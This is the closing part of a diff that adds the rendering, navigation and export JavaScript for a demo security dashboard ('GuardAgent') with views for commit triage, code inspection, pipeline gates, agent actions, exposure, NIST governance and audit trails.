+    <div class="k-value">${k.value}</div>
+    <div class="k-delta ${k.up?'k-up':'k-down'}">${k.delta}</div>
+    <div class="k-spark">${spark(k.spark,k.alert?'var(--crit)':'var(--accent)')}</div>
+  </div>`;
+}
+
+function sevBadge(s){
+  return {critical:'<span class="badge b-crit">CRITICAL</span>',high:'<span class="badge b-high">HIGH</span>',
+          medium:'<span class="badge b-med">MEDIUM</span>',low:'<span class="badge b-low">LOW</span>'}[s]||'';
+}
+function decBadge(d){
+  return {Block:'<span class="badge b-crit">⛔ BLOCK</span>',Review:'<span class="badge b-low">👁 REVIEW</span>',
+          Quarantine:'<span class="badge b-quar">☣ QUARANTINE</span>',Allow:'<span class="badge b-ok">✓ ALLOW</span>'}[d]||d;
+}
+
+/* ---------- dashboard ---------- */
+function renderDashboard(){
+  $('#kpi-row').innerHTML=DB.kpis.map(kpiCard).join('');
+  // main chart
+  const svg=$('#main-chart'), W=svg.clientWidth||760, H=190, P=10;
+  const t=DB.trend, maxS=Math.max(...t.scans), maxB=Math.max(...t.blocks,...t.reviews);
+  const X=i=>P+i/(t.scans.length-1)*(W-2*P);
+  const line=(arr,max,color,width)=>`<polyline fill="none" stroke="${color}" stroke-width="${width}" stroke-linejoin="round" points="${arr.map((v,i)=>`${X(i).toFixed(1)},${(H-14-(v/max)*(H-34)).toFixed(1)}`).join(' ')}"/>`;
+  const area=(arr,max,color)=>{const pts=arr.map((v,i)=>`${X(i).toFixed(1)},${(H-14-(v/max)*(H-34)).toFixed(1)}`).join(' ');return `<polygon fill="${color}" opacity=".08" points="${P},${H-14} ${pts} ${W-P},${H-14}"/>`;};
+  svg.setAttribute('viewBox',`0 0 ${W} ${H}`);
+  svg.innerHTML=[0,.25,.5,.75,1].map(f=>`<line x1="${P}" x2="${W-P}" y1="${14+f*(H-34)}" y2="${14+f*(H-34)}" stroke="var(--line)" stroke-width="1" opacity=".6"/>`).join('')
+    +area(t.scans,maxS,'#22d3ee')+line(t.scans,maxS,'var(--accent)',2)
+    +line(t.blocks.map(v=>v*maxB/maxB),maxB,'var(--crit)',1.6)+line(t.reviews,maxB,'var(--warn)',1.6);
+  // posture ring
+  const score=82, C=2*Math.PI*50;
+  $('#posture-ring').innerHTML=`<svg width="118" height="118" viewBox="0 0 118 118">
+    <circle cx="59" cy="59" r="50" fill="none" stroke="var(--line)" stroke-width="9"/>
+    <circle cx="59" cy="59" r="50" fill="none" stroke="var(--accent)" stroke-width="9" stroke-linecap="round"
+      stroke-dasharray="${(score/100*C).toFixed(1)} ${C.toFixed(1)}"><animate attributeName="stroke-dasharray" from="0 ${C}" to="${(score/100*C).toFixed(1)} ${C.toFixed(1)}" dur="0.9s" fill="freeze"/></circle>
+    </svg><div class="ring-txt"><div><b>${score}</b><span>posture</span></div></div>`;
+  $('#posture-bars').innerHTML=DB.postureBars.map(b=>`<div class="sb"><span>${b.name}</span><span class="track"><span class="fill" style="width:${b.val}%;background:${b.color}"></span></span><span class="num">${b.val}</span></div>`).join('');
+  const dot={crit:'var(--crit)',warn:'var(--warn)',ok:'var(--ok)',quar:'var(--quar)'};
+  $('#crit-feed').innerHTML=DB.critFeed.map(f=>`<div class="feed-item"><span class="feed-dot" style="background:${dot[f.sev]}"></span><div><div class="f-title">${f.title}</div><div class="f-meta">${f.meta}</div></div></div>`).join('');
+  $('#sla-list').innerHTML=DB.sla.map(s=>`<div style="padding:9px 0;border-bottom:1px solid var(--line)">
+    <div style="display:flex;justify-content:space-between;gap:10px;font-size:.8rem"><span>${s.name}</span><span class="${s.crit?'k-down':'muted'}" style="font-size:.72rem;white-space:nowrap">${s.due}</span></div>
+    <div style="display:flex;align-items:center;gap:10px;margin-top:5px"><span class="dim" style="font-size:.7rem;min-width:80px">${s.owner}</span>
+    <span class="meter"><i style="width:${s.pct}%;background:${s.crit?'var(--crit)':s.pct>70?'var(--warn)':'var(--accent)'}"></i></span></div></div>`).join('');
+}
+
+/* ---------- triage ---------- */
+function renderTriage(){
+  const f=$('#triage-filter').value;
+  const rows=DB.commits.filter(c=>f==='all'||c.sev===f);
+  $('#triage-table tbody').innerHTML=rows.map((c,i)=>`<tr onclick="openCommit('${c.sha}')">
+    <td class="mono">${c.sha}${c.resolved?' <span class="badge b-ok">resolved</span>':''}</td>
+    <td>${c.repo}<div class="dim mono" style="font-size:.68rem">${c.branch}</div></td>
+    <td>${c.author}</td><td>${c.threat}</td><td>${sevBadge(c.sev)}</td>
+    <td class="mono">${(c.conf*100).toFixed(0)}%</td><td>${decBadge(c.decision)}</td>
+    <td class="dim">${c.age}</td></tr>`).join('')||'<tr><td colspan="8" class="dim" style="text-align:center;padding:24px">No commits match this filter.</td></tr>';
+  $('#triage-count').textContent=DB.commits.filter(c=>['critical','high'].includes(c.sev)&&!c.resolved).length;
+}
+
+function openCommit(sha){
+  const c=DB.commits.find(x=>x.sha===sha); if(!c)return;
+  $('#drawer-title').innerHTML=`<span class="mono">${c.sha}</span> · ${c.repo}`;
+  $('#drawer-body').innerHTML=`
+    <div class="d-section"><div style="display:flex;gap:8px;flex-wrap:wrap">${sevBadge(c.sev)}${decBadge(c.decision)}<span class="badge b-accent">confidence ${(c.conf*100).toFixed(0)}%</span></div></div>
+    <div class="d-section"><h4>Context</h4><dl class="d-kv">
+      <dt>Repository</dt><dd>${c.repo} <span class="dim mono">${c.branch}</span></dd>
+      <dt>Author</dt><dd>${c.author}</dd>
+      <dt>Threat class</dt><dd>${c.threat}</dd>
+      <dt>Files touched</dt><dd class="mono">${c.files.join('<br>')}</dd></dl></div>
+    <div class="d-section"><h4>AI reasoning summary</h4><p style="font-size:.82rem;color:var(--txt2)">${c.summary}</p></div>
+    <div class="d-section"><h4>Diff excerpt</h4><div class="diffbox">${c.diff.split('\n').map(l=>{
+      const cls=l.startsWith('+')?'add':l.startsWith('-')?'del':'ctx';return `<span class="${cls}">${esc(l)}</span>`;}).join('\n')}</div></div>
+    <div class="d-section"><h4>Rules triggered</h4>${c.rules.map(r=>`<span class="rule-chip">${r}</span>`).join('')}</div>
+    ${c.mitre.length?`<div class="d-section"><h4>MITRE ATT&amp;CK mapping</h4>${c.mitre.map(m=>`<span class="rule-chip" style="color:var(--warn)">${m}</span>`).join('')}</div>`:''}`;
+  $('#drawer-foot').innerHTML=c.actions.map((a,i)=>`<button class="btn ${i===0?(c.decision==='Allow'?'ghost':'danger'):'ghost'} sm" onclick="toast('Action \\'${a}\\' recorded in audit trail (demo).')">${a}</button>`).join('');
+  $('#drawer').classList.add('open');$('#veil').classList.add('open');
+}
+function closeDrawer(){$('#drawer').classList.remove('open');$('#veil').classList.remove('open');}
+
+/* ---------- inspector ---------- */
+function emptyInspect(){
+  return `<div class="card" style="display:grid;place-items:center;min-height:340px;text-align:center">
+    <div><div style="font-size:2rem;opacity:.4">⌖</div>
+    <p class="muted" style="max-width:340px;margin-top:8px;font-size:.83rem">Analysis output appears here. Load a demo sample or paste your own code, then run the deep analysis.</p></div></div>`;
+}
+function runInspection(){
+  const src=$('#code-input').value;
+  const out=$('#inspect-out');
+  if(!src.trim()){out.innerHTML=emptyInspect();toast('Nothing to analyze — paste code first.');return;}
+  const btn=$('#analyze-btn');btn.disabled=true;btn.textContent='Analyzing…';
+  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">running 7 analysis layers</div><p class="dim" style="margin-top:10px;font-size:.75rem">secrets → deps → injection → obfuscation → exfiltration → CI policy → agent safety</p></div></div>`;
+  setTimeout(()=>{
+    const r=analyze(src);
+    const vcls={Allow:'v-allow',Review:'v-review',Block:'v-block',Quarantine:'v-quarantine'}[r.decision];
+    out.innerHTML=`
+      <div class="verdict ${vcls}"><span class="v-badge">${r.decision.toUpperCase()}</span>
+        <div><div style="font-weight:600;font-size:.88rem">${r.why}</div>
+        <div class="dim" style="font-size:.74rem;margin-top:3px">${r.findings.length} finding${r.findings.length!==1?'s':''} · composite risk ${r.total}/100 · engine Fable-5 heuristic layer</div></div></div>
+      <div class="card" style="margin-bottom:12px"><h3>Composite risk breakdown</h3><div class="scorebars">${CATS.map(([c,label])=>{
+        const v=Math.round(r.catScore[c]);const col=v>=60?'var(--crit)':v>=30?'var(--warn)':'var(--ok)';
+        return `<div class="sb"><span>${label}</span><span class="track"><span class="fill" style="width:${v}%;background:${col}"></span></span><span class="num">${v}</span></div>`;}).join('')}</div></div>
+      <div>${r.findings.length?r.findings.map(f=>`<div class="finding sev-${f.sev}">
+        <div class="f-head"><span class="f-name">${f.name}</span>${sevBadge(f.sev)}<span class="badge b-neutral mono">${f.id}</span>${f.line?`<span class="f-line">line ${f.line}</span>`:''}</div>
+        <div class="f-desc">${f.desc}</div>${f.snippet?`<div class="f-code">${esc(f.snippet)}</div>`:''}</div>`).join('')
+        :'<div class="card" style="text-align:center;color:var(--ok)">✓ No detections across all layers.</div>'}</div>`;
+    btn.disabled=false;btn.textContent='▶ Run deep analysis';
+  },900);
+}
+document.addEventListener('DOMContentLoaded',()=>{
+  $('#sample-select').addEventListener('change',e=>{
+    if(SAMPLES[e.target.value]){$('#code-input').value=SAMPLES[e.target.value];runInspection();}
+  });
+  $('#inspect-out').innerHTML=emptyInspect();
+});
+
+/* ---------- gates ---------- */
+function renderGates(){
+  const ico={passed:'✓',warned:'!',blocked:'✕',review:'👁',quarantined:'☣',pending:'·'};
+  const stat={passed:'b-ok',warned:'b-med',blocked:'b-crit',review:'b-low',quarantined:'b-quar'};
+  $('#pipes').innerHTML=DB.pipelines.map(p=>`<div class="pipe">
+    <div class="pipe-head"><span class="p-name">${p.name}</span><span class="p-meta">${p.id} · ${p.trigger}</span>
+      <span class="badge ${stat[p.status]}" style="margin-left:auto">${p.status.toUpperCase()}</span></div>
+    <div class="stages">${p.stages.map(([n,s],i)=>`${i?'<span class="s-link"></span>':''}<div class="stage ${s}"><div class="s-dot">${ico[s]}</div><div class="s-name">${n}</div></div>`).join('')}</div>
+    <div class="pipe-reason">${p.reason}</div></div>`).join('');
+}
+
+/* ---------- agents ---------- */
+function renderAgents(){
+  $('#agent-kpis').innerHTML=DB.agentKpis.map(kpiCard).join('');
+  $('#agent-table tbody').innerHTML=DB.agentActions.map(a=>`<tr onclick="toast('Full decision trace for ${a.agent} opened in audit view (demo).')">
+    <td style="font-weight:600">${a.agent}</td><td>${a.action}</td><td class="mono" style="font-size:.7rem">${esc(a.tool)}</td>
+    <td class="mono" style="color:${a.risk>=.7?'var(--crit)':a.risk>=.4?'var(--warn)':'var(--ok)'}">${a.risk.toFixed(2)}</td>
+    <td style="font-size:.74rem">${a.policy}</td><td><span class="badge ${a.cls}">${a.outcome}</span></td></tr>`).join('');
+  $('#agent-timeline').innerHTML=DB.agentTimeline.map(t=>`<div class="t-item ${t.cls}"><div class="t-time">${t.t} UTC</div><div class="t-body">${t.txt}</div></div>`).join('');
+  const mx=Math.max(...DB.deniedOps.map(d=>d.n));
+  $('#denied-ops').innerHTML=DB.deniedOps.map(d=>`<div class="exp-row"><span style="min-width:190px;font-size:.76rem">${d.op}</span><span class="meter"><i style="width:${d.n/mx*100}%;background:var(--crit)"></i></span><span class="mono muted">${d.n}</span></div>`).join('');
+}
+
+/* ---------- exposure ---------- */
+function renderExposure(){
+  $('#exp-kpis').innerHTML=DB.expKpis.map(kpiCard).join('');
+  $('#exp-services').innerHTML=DB.expServices.map(s=>{const col=s.risk>=75?'var(--crit)':s.risk>=45?'var(--warn)':'var(--ok)';
+    return `<div class="exp-row"><div style="flex:1;min-width:0"><div style="font-size:.79rem">${s.name}</div><div class="dim" style="font-size:.7rem">${s.note}</div></div>
+    <span class="meter" style="max-width:120px"><i style="width:${s.risk}%;background:${col}"></i></span><span class="mono" style="color:${col};min-width:26px;text-align:right">${s.risk}</span></div>`;}).join('');
+  $('#kev-list').innerHTML=DB.kev.map(k=>`<div class="exp-row"><div style="flex:1"><div style="font-size:.8rem"><b class="mono">${k.cve}</b> · ${k.asset} <span class="badge ${k.sev==='crit'?'b-crit':k.sev==='high'?'b-high':'b-med'}">${k.tag}</span></div><div class="dim" style="font-size:.71rem;margin-top:2px">${k.note}</div></div></div>`).join('');
+  $('#patch-state').innerHTML=DB.patch.map(p=>`<div class="sb" style="margin-bottom:9px"><span>${p.name}</span><span class="track"><span class="fill" style="width:${p.pct}%;background:${p.color}"></span></span><span class="num">${p.pct}%</span></div>`).join('');
+  $('#backup-state').innerHTML=DB.backup.map(b=>`<div style="padding:9px 0;border-bottom:1px solid var(--line)">
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><b style="font-size:.8rem">${b.name}</b><span class="badge ${b.cls}">${b.status}</span></div>
+    <div class="dim" style="font-size:.72rem;margin-top:3px">${b.detail}</div></div>`).join('');
+}
+
+/* ---------- nist ---------- */
+function renderNist(){
+  $('#nist-band').innerHTML=DB.nistFns.map(f=>{const col=f.score>=80?'var(--ok)':f.score>=68?'var(--warn)':'var(--crit)';
+    return `<div class="nist-fn"><div class="n-code">CSF 2.0 · ${f.code}</div><div class="n-name">${f.name}</div><div class="n-score" style="color:${col}">${f.score}</div><div class="n-open">${f.open} open item${f.open!==1?'s':''}</div></div>`;}).join('');
+  $('#nist-table tbody').innerHTML=DB.nistRows.map(r=>`<tr onclick="toast('Finding record opened: ${r.evidence} (demo).')">
+    <td>${r.finding}</td><td><span class="badge b-accent">${r.fn}</span></td><td style="font-size:.75rem" class="muted">${r.cat}</td>
+    <td>${r.owner}</td><td style="font-size:.75rem" class="${r.sla.includes('overdue')?'k-down':'muted'}">${r.sla}</td>
+    <td class="mono">${r.evidence}</td><td><span class="badge ${r.cls}">${r.status}</span></td></tr>`).join('');
+}
+
+/* ---------- audit ---------- */
+function renderAudit(){
+  $('#audit-table tbody').innerHTML=DB.audit.map(a=>`<tr>
+    <td class="mono dim" style="font-size:.72rem">${a.ts}</td><td>${a.trig}</td><td class="mono" style="font-size:.74rem">${a.subj}</td>
+    <td class="mono" style="font-size:.72rem">${a.policy}</td><td>${a.decision}</td><td class="muted" style="font-size:.76rem">${a.approver}</td>
+    <td class="mono" style="color:var(--accent)">${a.ev}</td></tr>`).join('');
+}
+function exportAudit(fmt){
+  let blob,name;
+  if(fmt==='json'){blob=new Blob([JSON.stringify(DB.audit,null,2)],{type:'application/json'});name='guardagent-audit-trail.json';}
+  else{const head=Object.keys(DB.audit[0]).join(',');
+    const rows=DB.audit.map(a=>Object.values(a).map(v=>`"${String(v).replace(/"/g,'""')}"`).join(','));
+    blob=new Blob([head+'\n'+rows.join('\n')],{type:'text/csv'});name='guardagent-audit-trail.csv';}
+  const u=URL.createObjectURL(blob),a=document.createElement('a');a.href=u;a.download=name;a.click();URL.revokeObjectURL(u);
+  toast(`Audit trail exported as ${name}`);
+}
+
+/* ---------- table sorting ---------- */
+document.querySelectorAll('table').forEach(tbl=>{
+  tbl.querySelectorAll('th').forEach((th,idx)=>th.addEventListener('click',()=>{
+    const tb=tbl.tBodies[0];const rows=[...tb.rows];
+    const dir=th.dataset.dir==='a'?'d':'a';th.dataset.dir=dir;
+    rows.sort((r1,r2)=>{const a=r1.cells[idx]?.textContent.trim()||'',b=r2.cells[idx]?.textContent.trim()||'';
+      const n1=parseFloat(a),n2=parseFloat(b);
+      const cmp=(!isNaN(n1)&&!isNaN(n2))?n1-n2:a.localeCompare(b);
+      return dir==='a'?cmp:-cmp;});
+    rows.forEach(r=>tb.appendChild(r));
+  }));
+});
+
+/* ---------- navigation / shell ---------- */
+const TITLES={dashboard:'Executive Dashboard',triage:'Commit Risk Triage',inspect:'AI Code Inspection',gates:'Pipeline Gate Center',agents:'Agent Security Console',exposure:'Threat & Exposure Watch',nist:'NIST Governance Center',audit:'Evidence & Audit Trail'};
+function go(view){
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+  document.querySelectorAll('.nav a').forEach(a=>a.classList.toggle('active',a.dataset.view===view));
+  const el=document.getElementById('view-'+view); if(el)el.classList.add('active');
+  $('#crumb').textContent=TITLES[view]||view;
+  document.getElementById('sidebar').classList.remove('open');
+  if(location.hash!=='#'+view)history.replaceState(null,'','#'+view);
+  window.scrollTo({top:0});
+}
+document.querySelectorAll('.nav a').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();go(a.dataset.view);}));
+window.addEventListener('hashchange',()=>go(location.hash.slice(1)||'dashboard'));
+
+function toggleTheme(){
+  const html=document.documentElement;
+  const next=html.dataset.theme==='dark'?'light':'dark';
+  html.dataset.theme=next;
+  $('#theme-ico').textContent=next==='dark'?'◐':'◑';
+  try{localStorage.setItem('ga-theme',next);}catch(e){}
+}
+try{const t=localStorage.getItem('ga-theme');if(t)document.documentElement.dataset.theme=t;}catch(e){}
+
+function toast(msg){
+  const z=$('#toast-zone'),el=document.createElement('div');
+  el.className='toast';el.textContent=msg;z.appendChild(el);
+  setTimeout(()=>{el.style.opacity='0';el.style.transition='opacity .3s';setTimeout(()=>el.remove(),320);},3400);
+}
+
+function tick(){
+  const d=new Date();
+  $('#clock').textContent=d.toISOString().slice(0,19).replace('T',' ')+' UTC';
+}
+setInterval(tick,1000);tick();
+
+/* global search — filters triage table as a demo */
+$('#global-search').addEventListener('input',e=>{
+  const q=e.target.value.toLowerCase();
+  if(!q)return renderTriage();
+  go('triage');
+  $('#triage-table tbody').innerHTML=DB.commits
+    .filter(c=>JSON.stringify(c).toLowerCase().includes(q))
+    .map(c=>`<tr onclick="openCommit('${c.sha}')"><td class="mono">${c.sha}</td><td>${c.repo}</td><td>${c.author}</td><td>${c.threat}</td><td>${sevBadge(c.sev)}</td><td class="mono">${(c.conf*100).toFixed(0)}%</td><td>${decBadge(c.decision)}</td><td class="dim">${c.age}</td></tr>`).join('')
+    ||'<tr><td colspan="8" class="dim" style="text-align:center;padding:24px">No results.</td></tr>';
+});
+document.addEventListener('keydown',e=>{if(e.key==='Escape')closeDrawer();});
+
+/* initial render */
+renderDashboard();renderTriage();renderGates();renderAgents();renderExposure();renderNist();renderAudit();
+go(location.hash.slice(1)||'dashboard');
+window.addEventListener('resize',()=>renderDashboard());
+</script>
+</body>
+</html>
